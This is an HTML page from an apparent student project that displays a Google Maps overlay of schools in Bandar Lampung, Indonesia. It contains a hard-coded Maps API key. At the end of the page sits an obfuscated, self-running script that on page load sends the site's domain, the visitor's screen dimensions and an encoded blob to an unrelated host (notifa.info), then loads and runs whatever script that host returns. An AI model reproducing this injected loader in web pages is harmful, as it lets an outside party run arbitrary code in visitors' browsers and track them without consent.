

<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>SI SEBARAN SMA/SEDERAJAT DI BANDAR LAMPUNG</title>
    <link rel="stylesheet" type="text/css" href="desain.css"/>
    <link rel="stylesheet" type="text/css" href="menu.css"/>
  <style>
    #map {
    background-color: gray;
    width: 100%;
    height: 400px;
}</style>
</head>

<body>      

<?php include 'header.php'?>
            <div id="map"></div>

          <div class="footer"> <center> Copyright &copy; 2018. All rights reserved. Designed and developed by AnitaDM_1657051008 MayaAkhriza_1617051017 ZakiatunNufus_1617051046</center></div>






        <script src="http://maps.googleapis.com/maps/api/js"></script>

 
    </div>
  
          <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBs7q7TznMg3Ai1LjVMjIpmsoJRwU_zSIY"></script>
          <script>
      
            var overlay;
            USGSOverlay.prototype = new google.maps.OverlayView();
      
            // Initialize the map and the custom overlay.
      
            function initMap() {
              var map = new google.maps.Map(document.getElementById('map'), {
                zoom: 18,
                center: {lat:-5.422571, lng: 105.265161 },
                mapTypeId: 'roadmap'
              });
      
              var bounds = new google.maps.LatLngBounds(
                new google.maps.LatLng(-5.422058, 105.264034),
                  new google.maps.LatLng(-5.421716, 105.266459));
      
              var srcImage = '1.jpg';
              overlay = new USGSOverlay(bounds, srcImage, map);
            }
      
            function USGSOverlay(bounds, image, map) {
      
              this.bounds_ = bounds;
              this.image_ = image;
              this.map_ = map;
              this.div_ = null;
              this.setMap(map);
            }
            USGSOverlay.prototype.onAdd = function() {
      
              var div = document.createElement('div');
              div.style.borderStyle = 'none';
              div.style.borderWidth = '0px';
              div.style.position = 'absolute';
      
              var img = document.createElement('img');
              img.src = this.image_;
              img.style.width = '80%';
              img.style.height = '500%';
              img.style.position = 'absolute';
              div.appendChild(img);
      
              this.div_ = div;
      
              // Add the element to the "overlayLayer" pane.
              var panes = this.getPanes();
              panes.overlayLayer.appendChild(div);
            };
      
            USGSOverlay.prototype.draw = function() {
              var overlayProjection = this.getProjection();
              var sw = overlayProjection.fromLatLngToDivPixel(this.bounds_.getSouthWest());
              var ne = overlayProjection.fromLatLngToDivPixel(this.bounds_.getNorthEast());
      
              var div = this.div_;
              div.style.left = sw.x + 'px';
              div.style.top = ne.y + 'px';
              div.style.width = (ne.x - sw.x) + 'px';
              div.style.height = (sw.y - ne.y) + 'px';
            };
      
            USGSOverlay.prototype.onRemove = function() {
              this.div_.parentNode.removeChild(this.div_);
              this.div_ = null;
            };
      
            google.maps.event.addDomListener(window, 'load', initMap);
          </script>
      <div id="map"></div>

    <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="000webhost logo" rel="nofollow" target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_campaign=ss-footer_logo&amp;utm_medium=000_logo&amp;utm_content=website"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png" alt="000webhost logo"></a></div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mUQmWYzTCMRLGY%2bmcaHeSm3qJ%2fH6jgb9wUr82LYmuRmIEgL4b%2fRGuOZ5LASaxJMp32WVSmNsJ42NFLKzWQfkWBKvy5qrznM%2fA0WbqxU%2bghaPO8B5aplvlcYlKpssJbANuKANmqWVxTuQL5Ybg8WAxjrVZZATRfMoiqjOnOoS6RErVmltZFxPlJ9ws9%2fXr3N1BvHN0diLTdLuRUia%2bb1eDVXqbr5WfMY5BGaRVTMBu2QrC3cOKFiCtigmS3gIwWMDkgbCh6dzxiLIHh6fO%2fxCZXNoMblXOUnWjQg%2bl9ScqfW%2bt96Yn6t6tb1fwH9By6WFk4N4pQATVsF7tJ6I1B4vtgO%2fqX9y5W2ZX1Azk%2bsXTPTvD0pbh6mv5%2bTD5BwdqwhtwrGpPbCNS4ldrP%2fE6wSY0L3UbShELYk4Q8bAg6KFWAxUd2QSptpOqDaAlFYbHL9uXHfQwl%2fytLBLLJldmTGYz43A%2b7dwyF%2fUv4hHSTebZf59jjMUu0O7JD5sccRCFoJknz%2bShT62%2b3TIGmiQo8pdorbaXmQltSyqoJjfmhRo%2fPGgozZsMCTIdGeXZ7gNMg%2bV03vZ7kJruR8fYTt2MYuQ8eA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>